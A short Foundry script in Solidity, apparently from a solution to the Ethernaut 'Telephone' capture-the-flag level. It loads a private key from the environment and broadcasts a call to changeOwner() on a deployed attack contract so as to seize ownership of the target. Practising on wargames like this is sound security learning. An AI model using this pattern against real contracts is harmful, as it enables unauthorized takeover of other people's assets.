// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import {Attack} from "src/telephone/Attack.sol";

contract AttackScript is Script {
    function run() external {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        address ownerAddress = vm.addr(deployerPrivateKey);
        Attack attack = Attack(0xA062E89e79668b873004Bf60c588C899289D4166);
        vm.startBroadcast(deployerPrivateKey);
        attack.changeOwner();
        vm.stopBroadcast();
    }
}